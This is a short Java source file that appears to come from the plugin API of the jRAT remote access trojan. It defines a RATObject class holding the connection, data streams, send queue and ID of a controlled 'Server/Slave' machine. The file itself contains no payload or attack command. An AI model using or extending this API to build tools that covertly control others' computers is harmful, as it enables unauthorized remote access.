package pro.jrat.api;

import java.io.DataInputStream;
import java.io.DataOutputStream;

public final class RATObject {

	private final String ip;
	private final Connection con;
	private final Writer writer;
	private final Reader reader;
	private final Queue queue;
	private final DataInputStream in;
	private final DataOutputStream out;
	private final long uniqueId;
	
	public RATObject(String ip, long uniqueId, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
		this.ip = ip;
		this.con = con;
		this.writer = writer;
		this.reader = reader;
		this.queue = queue;
		this.in = in;
		this.out = out;
		this.uniqueId = uniqueId;
	}
	
	/**
	 * 
	 * @return IP of server in format "IP / PORT"
	 */
	
	public String getIP() {
		return ip;
	}
	
	/**
	 * 
	 * @return The connection class with connection information about this server
	 */
	
	public Connection getConnection() {
		return con;
	}

	
	/**
	 * 
	 * @return Writer
	 */
	
	public Writer getDataWriter() {
		return writer;
	}
	
	/**
	 * 
	 * @return Reader
	 */
	
	public Reader getDataReader() {
		return reader;
	}
	
	/**
	 * Adds packet to send queue and falls back to controller
	 * @param packet
	 */
	
	public void addToSendQueue(PacketBuilder packet) throws Exception {
		queue.addToSendQueue(packet, this);
	}
	
	
	/**
	 * Only equals if IP is
	 */
	
	@Override
	public boolean equals(Object obj) {
		if (obj instanceof RATObject) {
			return this == obj || ((RATObject)obj).uniqueId == uniqueId;
		}
		
		return false;
	}
	
	/**
	 * Use addToSendQueue directly
	 * @return The packet queue
	 */
	@Deprecated
	public Queue getQueue() {
		return queue;
	}
	
	public DataInputStream getDataInputStream() {
		return in;
	}
	
	public DataOutputStream getDataOutputStream() {
		return out;
	}

	/**
	 * Returns the unique ID for this Server/Slave/Object
	 * @return
	 */
	public long getUniqueId() {
		return uniqueId;
	}

}
